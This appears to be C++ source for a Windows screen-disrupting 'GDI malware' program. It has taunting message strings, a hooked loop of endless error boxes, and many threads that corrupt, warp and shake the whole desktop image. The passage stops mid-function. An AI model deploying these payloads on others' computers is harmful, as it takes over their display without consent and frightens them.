﻿#pragma warning(disable: 4995)
#pragma comment(lib, "Dwmapi.lib")
#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#include<dwmapi.h>
#include"resource.h"
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")//use lambdaexec Neoarsphenamine\def.h
#pragma optimize("", off)//disable "t>>t" return 0
#define RndRGB RGB(rand() % 255, rand() % 255, rand() % 255)
#define RGBBRUSH 0x1900ac010e
LPCSTR texts[] = { "L0S3R","What you want to say?","L0L","78915418813141145141919810","Go die!!!","Still using this computer?","This equipment is useless.","by uiui","zjbddkksl11.exe" };
LPCSTR texts2[] = { "CreatePen","CreateSolidBrush","CreateCompatibleBitmap","CreateCombatibleDC","CreateFont","CreateHatchBrush","CreatePatternBrush" };
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
LPCSTR iconLibraryNames[] = { "imageres.dll","shell32.dll","moricons.dll","pifmgr.dll" };
using namespace std;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
typedef struct {
    float x;
    float y;
    float z;
} VERTEX;
namespace _3D {
    VOID RotateX(VERTEX* vtx, float angle) {
        vtx->y = cos(angle) * vtx->y - sin(angle) * vtx->z;
        vtx->z = sin(angle) * vtx->y + cos(angle) * vtx->z;
    }
    VOID RotateY(VERTEX* vtx, float angle) {
        vtx->x = cos(angle) * vtx->x + sin(angle) * vtx->z;
        vtx->z = -sin(angle) * vtx->x + cos(angle) * vtx->z;
    }
    VOID RotateZ(VERTEX* vtx, float angle) {
        vtx->x = cos(angle) * vtx->x - sin(angle) * vtx->y;
        vtx->y = sin(angle) * vtx->x + cos(angle) * vtx->y;
    }
    void DrawEdge(HDC dc, int x0, int y0, int x1, int y1, int r) {
        int dx = abs(x1 - x0);
        int dy = -abs(y1 - y0);
        int sx = (x0 < x1) ? 1 : -1;
        int sy = (y0 < y1) ? 1 : -1;
        int error = dx + dy;
        int i = 0;
        HMODULE hModule = LoadLibrary(TEXT("moricons.dll"));
        while (true) {
            int randomIcon = rand() % (114 - 50 + 1) + 50;
            if (i == 0) {
                DrawIcon(dc, x0, y0, LoadIcon(hModule, MAKEINTRESOURCE(randomIcon)));
                i = 10;
            }
            else {
                i--;
            }
            if (x0 == x1 && y0 == y1) {
                break;
            }
            int e2 = 2 * error;
            if (e2 >= dy) {
                if (x0 == x1) {
                    break;
                }
                error += dy;
                x0 += sx;
            }
            if (e2 <= dx) {
                if (y0 == y1) {
                    break;
                }
                error += dx;
                y0 += sy;
            }
        }
    }
}
struct Point3D {
    float x, y, z;
};
typedef struct {
    int vtx0;
    int vtx1;
} EDGE;
namespace Colors {
    //These HSL functions was made by Wipet, credits to him!(write by pankoza)
    //And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
    int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
    XFORM xform;
    if (Angle != 0) {
        double fangle = (double)Angle / 180. * 3.1415926;
        xform.eM11 = (float)cos(fangle);
        xform.eM12 = (float)sin(fangle);
        xform.eM21 = (float)-sin(fangle);
        xform.eM22 = (float)cos(fangle);
        xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
        xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
        SetWorldTransform(hdc, &xform);
    }
    return nGraphicsMode;
}
int red, green, blue; bool ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
#define PI 3.14159265358979323846
LPCWSTR GetRandomChar(int length) {
    wchar_t* strRandom = new wchar_t[length + 1];
    for (int i = 0; i < length; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }
    strRandom[length] = L'\0';
    return strRandom;
}
Point3D RotatePoint(Point3D p, float x, float y, float z) {
    float cosX = cos(x), sinX = sin(x);
    float cosY = cos(y), sinY = sin(y);
    float cosZ = cos(z), sinZ = sin(z);
    float y2 = p.y * cosX - p.z * sinX;
    float z2 = p.y * sinX + p.z * cosX;
    p.y = y2;
    p.z = z2;
    float x2 = p.x * cosY + p.z * sinY;
    z2 = -p.x * sinY + p.z * cosY;
    p.x = x2;
    p.z = z2;
    x2 = p.x * cosZ - p.y * sinZ;
    y2 = p.x * sinZ + p.y * cosZ;
    p.x = x2;
    p.y = y2;
    return(p);
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    HBITMAP old = (HBITMAP)SelectObject(hdc, hBrush);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x + y, x - y, PATINVERT);
    SelectClipRgn(hdc, NULL);
    SelectObject(hdc, old);
    DeleteObject(hrgn);
    DeleteObject(hBrush);
    ReleaseDC(NULL, hdc);
}
VOID WINAPI MG(HWND hwnd) {
    HWND window = hwnd;
    RECT windowRect;
    GetWindowRect(window, &windowRect);
    int w = windowRect.right - windowRect.left, h = windowRect.bottom - windowRect.top;
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = windowRect.right - windowRect.left;
    bmi.bmiHeader.biHeight = windowRect.bottom - windowRect.top;
    PRGBQUAD prgbScreen;
    for (int t = 0;; t += 20) {
        HDC hdc = GetDC(window);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        HBITMAP old = (HBITMAP)SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, bmi.bmiHeader.biWidth, bmi.bmiHeader.biHeight, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < bmi.bmiHeader.biWidth; x++) {
            for (int y = 0; y < bmi.bmiHeader.biHeight; y++) {
                prgbScreen[x + bmi.bmiHeader.biWidth * y].rgb += RndRGB % 0x606060;
            }
        }
        BitBlt(hdc, 0, 0, bmi.bmiHeader.biWidth, bmi.bmiHeader.biHeight, hcdc, 0, 0, SRCCOPY);
        SelectObject(hcdc, old); DeleteObject(hBitmap);
        DeleteDC(hcdc);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}
HANDLE th;
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        HWND hwnd = (HWND)wParam;
        th = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MG, hwnd, 0, NULL);
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI Window0(LPVOID) {
    for (;;) {
        HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
        MessageBoxExW(0, L"dsfsdfsdf!!", L"zjbddkksl11.exe - dsfsdfsjjja##!!", MB_ABORTRETRYIGNORE | MB_ICONERROR | MB_MISCMASK, 0);
        if (hook != NULL) { UnhookWindowsHookEx(hook); }
        TerminateThread(th, 0);
        CloseHandle(th);
    }
}
DWORD WINAPI Shader1(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x | y;
                rgbquad[x + w * y].rgb += 2 * (rgbquad[x + w * y].rgb | x);
            }
        }
        BitBlt(hdc, rand() % 100 - 50, rand() % 100 - 50, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader2(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 5 * (rand() % 12) ^ SRCCOPY + 0x0202020202020;
                rgbquad[x + w * y].rgb ^= 2 * (rgbquad[x + w * y].rgb | x);
            }
        }
        POINT p[3];
        p[0].x = rand() % 100 - 50; p[0].y = rand() % 100 - 50;
        p[1].x = w + rand() % 100 - 50; p[1].y = rand() % 100 - 50;
        p[2].x = rand() % 100 - 50; p[2].y = h + rand() % 100 - 50;
        PlgBlt(hdc, p, hcdc, 0, 0, w, h, 0, 0, 0);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader3(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x & y;
                rgbquad[x + w * y].rgb ^= x & y;
            }
        }
        for (int i = 0; i < 9; i++) {
            int y = rand() % h;
            BitBlt(hcdc, rand() % 5 - 2, y, w, 90, hcdc, 0, y, rand() % 2 ? SRCPAINT : SRCAND);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader4(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int rgb = (rgbquad[x + w * y].r + rgbquad[x + w * y].g + rgbquad[x + w * y].b) / 3;
                rgbquad[x + w * y].rgb = rgb * 0x010101;
                rgbquad[x + w * y].rgb ^= x * 0x010101;
                rgbquad[x + w * y].rgb ^= (x ^ y) * 0x010101;
            }
        }
        for (int i = 0; i < 5; i++) {
            int y = rand() % h;
            BitBlt(hcdc, rand() % 3 - 1, y, w, rand() % h, hcdc, 0, y, rand() % 2 ? SRCPAINT : SRCAND);
        }
        BitBlt(hdc, rand() % 10 - 5, rand() % 10 - 5, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader5(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int rrr = rand() % 2;
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += rrr * ((x ^ y) + x);
            }
        }
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 100;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader6(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x == y * (x * x & y * x & y) | !(x == y) * (111 & (x + y));
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Payload6(LPVOID) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0); POINT p[3];
        p[0].x = 10; p[0].y = -10;
        p[1].x = w + 10; p[1].y = 10;
        p[2].x = -10; p[2].y = h - 10;
        PlgBlt(hdc, p, hdc, 0, 0, w, h, 0, 0, 0);
        Sleep(100);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader7(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (double t = 0;; t += 4.f) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += RGB(x + x, y + y, x + y) + x + (RGB(x + y, y + y, x + x) + x + y) + y;
            }
        }
        BitBlt(hdc, cos(t * PI / 180.f) * 3, sin(t * PI / 180.f) * 3, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader8(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (double t = 0;; t += 4.f) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 0x010101;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI Payload8(LPVOID) {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 2, ySize = 9;
    double i2 = 0.f;
    while (1) {
        HDC hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        HBITMAP old = (HBITMAP)SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        int i;
        for (i = 0; i < sh * 2; i++) {
            int wave = cos((i + i2) * PI / xSize) * (ySize);
            BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
        }
        for (i = 0; i < sw * 2; i++) {
            int wave = sin((i2 + i) * PI / xSize) * (ySize);
            BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
        }
        i2 += 111.f;
        BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); SelectObject(hdcMem, old);
        DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
        Sleep(1);
    }
}
DWORD WINAPI Shader9(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += (SRCINVERT + SRCCOPY + RGBBRUSH) * 0x010101;
            }
        }
        HBRUSH b = CreateSolidBrush(0x010101 * (rand() % 255)); HBITMAP o = (HBITMAP)SelectObject(hdc, b);
        BitBlt(hdc, rand() % 100 - 50, rand() % 100 - 50, w, h, hcdc, 0, 0, RGBBRUSH);
        SelectObject(hdc, o); DeleteObject(b);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI Shader10(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x & w + 5 | x & y ^ (-y);
            }
        }
        BitBlt(hdc, 0, 2, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI Shader11(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0); HDC hcdc2 = CreateCompatibleDC(hdc);
        HBITMAP bmp2 = CreateCompatibleBitmap(hdc, w, h), old = (HBITMAP)SelectObject(hcdc2, bmp2);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x ^ y - (x | y | (x - x + y | 44) - 5) + x;
            }
        }
        BitBlt(hcdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int x = 20 + (rand() % 10);
            BitBlt(hcdc, -x, y, w, 1, hcdc2, 0, y, SRCCOPY); BitBlt(hcdc, w - x, y, w, 1, hcdc2, 0, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        SelectObject(hcdc2, old); DeleteObject(bmp2); DeleteDC(hcdc2);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader12(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0); HDC hcdc2 = CreateCompatibleDC(hdc);
        HBITMAP bmp2 = CreateCompatibleBitmap(hdc, w, h), old = (HBITMAP)SelectObject(hcdc2, bmp2);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x ^ y - (x | y | (x - x + y | 44) - 5) + x;
            }
        }
        BitBlt(hcdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        POINT p[3];
        p[0].x = 10; p[0].y = 0;
        p[1].x = w + 10; p[1].y = 0;
        p[2].x = -10; p[2].y = h;
        PlgBlt(hcdc, p, hcdc2, 0, 0, w, h, 0, 0, 0);
        p[0].x = -w + 10; p[0].y = 0;
        p[1].x = 10; p[1].y = 0;
        p[2].x = -w - 10; p[2].y = h;
        PlgBlt(hcdc, p, hcdc2, 0, 0, w, h, 0, 0, 0);
        p[0].x = w + 10; p[0].y = 0;
        p[1].x = w + w + 10; p[1].y = 0;
        p[2].x = w - 10; p[2].y = h;
        PlgBlt(hcdc, p, hcdc2, 0, 0, w, h, 0, 0, 0);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        SelectObject(hcdc2, old); DeleteObject(bmp2); DeleteDC(hcdc2);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader13(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb |= (x << 5 | y >> 5 & x + 5) + (x ^ x & y);
            }
        }int rrr = h / (1 + rand() % 10);
        for (int y = 0; y < h; y += rrr) {
            BitBlt(hcdc, rand() % 50 - 25, y, w, rrr, hcdc, 0, y, SRCAND);
        }
        for (int i = 0; i < 10; i++) {
            BitBlt(hcdc, rand() % w, rand() % h, rand() % w, rand() % h, hcdc, 0, 0, SRCCOPY);
        }
        BitBlt(hdc, rand() % 50 - 25, rand() % 50 - 25, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader14(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb |= 5 & y + 6 * y + (x + w * y) ^ (x + y & y);
            }
        }int rrr = w / (1 + rand() % 10);
        for (int x = 0; x < h; x += rrr) {
            POINT p[3];
            int ran = rand() % 50;
            p[0].x = x; p[0].y = ran;
            p[1].x = x + rrr; p[1].y = -(rand() % 50);
            p[2].x = x; p[2].y = h + ran;
            PlgBlt(hcdc, p, hcdc, x, 0, rrr, h, 0, 0, 0);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCINVERT);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader15(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
